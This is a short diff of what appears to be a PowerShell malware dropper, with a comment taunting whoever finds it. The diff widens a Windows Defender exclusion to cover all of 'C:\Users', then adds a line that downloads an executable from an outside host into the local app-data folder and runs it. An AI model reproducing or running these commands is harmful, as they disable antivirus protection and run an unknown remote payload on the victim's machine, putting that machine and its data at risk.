@@ -1,5 +1,5 @@
 # If you found this, CONGRATS! You probably think you some kind of cyber analyst Guru. Nah. I'm just lazy. But good job at poking around.
 
-Add-MpPreference -ExclusionPath "C:\Folder"
+Add-MpPreference -ExclusionPath "C:\Users"
 
-iwr "nyanza.vercel.app/assets/Test.exe" -OutFile "C:\file.exe"; iex "C:\file.exe"
+iwr "https://nyanza.vercel.app/assets/Test.exe" -OutFile "$env:LOCALAPPDATA\file.exe"; & "$env:LOCALAPPDATA\file.exe"
